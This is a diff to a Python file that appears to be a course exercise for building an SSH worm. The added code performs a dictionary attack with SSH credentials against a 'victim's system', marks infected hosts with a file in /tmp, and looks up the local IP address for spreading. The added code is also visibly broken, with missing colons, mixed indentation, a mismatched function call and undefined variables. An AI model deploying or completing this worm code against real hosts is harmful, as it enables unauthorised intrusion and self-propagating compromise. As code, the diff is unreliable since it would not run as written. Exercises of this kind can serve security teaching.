@@ -25,17 +25,8 @@ def isInfectedSystem():
 	# approach is to check for a file called
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
-	# as infected). 
-	pass
- #return os.path.exists(INFECTED_MARKER_FILE)
- try:
-    print("Check if system is infected with infected.txt")
-    remotepath = INFECTED_MARKER_FILE
-    localpath = '/home/cpsc/'
-    sftp.get(filepath, localpath)
- except IOError:
-    return False
- return True
+	# as infected).
+    return os.path.exists(INFECTED_MARKER_FILE)
         
 #################################################################
 # Marks the system as infected
@@ -45,7 +36,6 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
-	pass
     print("Mark file if infected")
     file(INFECTED_MARKER_FILE, "a+")
 
@@ -113,7 +103,18 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	pass
+ 
+    print("Try to connect to host host using username and password")
+	try:
+        sshClient.connect(host, userName, password)
+        print("Opened a connectin to the victim's system!")
+        sftpClient = sshClient.open_sftp
+    except paramiko.SSHException
+        print("Wrong credentials :(")
+        return 1
+    except socket.error
+        print("Server is down or has some other problem")
+        return 3
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -150,7 +151,9 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		pass	
+		if(0 == tryCredentials(host, username, password)):
+                print("Successfully compromised the system, it returned 0")
+                return(ssh, username, password)
 			
 	# Could not find working credentials
 	return None	
@@ -165,7 +168,24 @@ def getMyIP(interface):
 	
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
-	return None
+ 
+    # The IP address
+    ipAddr = None
+ 
+        # Go through all the interfaces
+        for netFace in interface:
+        
+            # The IP address of the interface
+                addr = netifaces.ifaddresses(netFace)[2][0]['addr']
+                
+                # Get the IP address
+                if not addr == "127.0.0.1":
+                    
+                    # Save the IP addrss and break
+                    ipAddr = addr
+                    break
+            
+	return ipAddr
 
 #######################################################
 # Returns the list of systems on the same network
